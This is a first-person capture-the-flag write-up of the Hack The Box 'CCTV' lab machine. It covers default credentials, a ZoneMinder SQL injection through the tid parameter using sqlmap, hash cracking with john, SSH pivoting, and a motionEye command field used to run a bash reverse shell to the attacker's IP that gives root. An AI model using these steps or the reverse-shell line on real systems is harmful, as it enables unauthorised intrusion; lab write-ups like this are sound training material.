
CCTV solution:

Hi, I am Mohamed and this is my approach on HTB Season 10's seasonal machine, CCTV. And also my first writeup!

First, obviously start the machine and grab the ip, connect with your vpn on your linux machine and paste the ip in your browser. It should redirect you to the cctv.htb domain. And I also ran a nmap scan, results showed that port 22 and 80 were open, that is ssh and http respectively.

From the first look, the only two interactable things were the staff login and get a quote buttons. And ofcourse, I went for the staff login page which directs you to a cctv.htb/zm/login. Zm, zoneminder, hmm, could be good for later. The login page was pretty standard, I tried a basic SQLi and a NoSQLi but neither worked which slightly confused me.

Then I just tried default credentials, admin:admin. I logged in, moving through the GUI you will notice there are two other users, mark and superadmin. You also notice that the Zoneminder version is 1.37.63.

There actually wasn't much to do in the admin panel as most actions were limited to superadmin, so I searched around for ZM exploits and CVEs. I found a boolean-based SQLi. The vulnerability lives in the /web/ajax/event.php component where the tid parameter is directly passed into the SQL query. The vulnerability could be exploited on this version as it was only patched on versions 1.37.65 and above, just find the right endpoint, which was /zm/index.php?view=request&request=event&action=removetag&tid=1. 

Now manually exploiting this would be a complete hassle so I used sqlmap to automate it. At first, I thought dumping the entire database would be the move then I realised that it would be a very slow process that was prone to errors due to sessions expiring, so instead I targeted the two other users that exist in the database, Mark and Superadmin.

And so, it started pulling out the password hashes, letter by letter. They started with "$2y$10" then another dollar sign. A bcrypt hash. So after a while it extracted the superadmin hash, then the hash for the user mark, though I unfortunately got a corrupted hash for the user mark where a } was extracted, which is an impossible character for bcrypt hashes. Fortunately however, a friend of mine who had already completed the machine informed me that the curly braces should have been a y.

Now, we echo both hashes in a .txt file and let john do his magic. Mark's hash was cracked rather quickly, returning the password "opensesame". The superadmin hash seemed like it wasn't going to be cracked so I killed the process to save resources. 

So now that I have mark's password I could ssh onto the server. After logging in, you won't find a user.txt file, no easy flags. So I started navigating the files and found that there is another user, sa_mark. Sa probably standing for superadmin. And with a ls -la check I found that the user sa_mark holds the user.txt file, but obviously we can't access it.

So I dabbled a bit, and checked which ports were running internal services. 8765 on localhost, a simple curl command showed that it is a webpage, something we could tunnel on our machine and access via the browser. So I did. Another login page. Again no injections work. And even admin:admin doesn't work.

Hmm, what should I do? 

The page uses motioneye and the curl command return let us know that the admin username is just admin, so I searched in the ssh session for any stored credentials, or passwords for admin. Found a 40 character hexadecimal, could be SHA-1 or Ripemd160. Though for some reason it wasn't cracking easily. So I thought why not just use it in the password section? So I did, surprisingly, it worked because motion eye accepts both passwords and hashes for logins.

Now I was in a motioneye page with several options, I saw some labeled "Run A Command" so on my linux machine I started a listener on port 4444 and then pasted bash -c 'bash -i >& /dev/tcp/10.10.16.244/4444 0>&1' into each Run A Command section. I wasn't sure how to trigger it though, simply applying the settings didn't work. 

Then I noticed a camera button, "take a snapshot". Clicked it and the reverse shell was established and I was logged in as root, simple traversal and searching would let you retrieve the user flag and root flag from user.txt and root.txt files respectively. Paste the two sets of 32 hexadecimal characters and you will have successfully completed CCTV.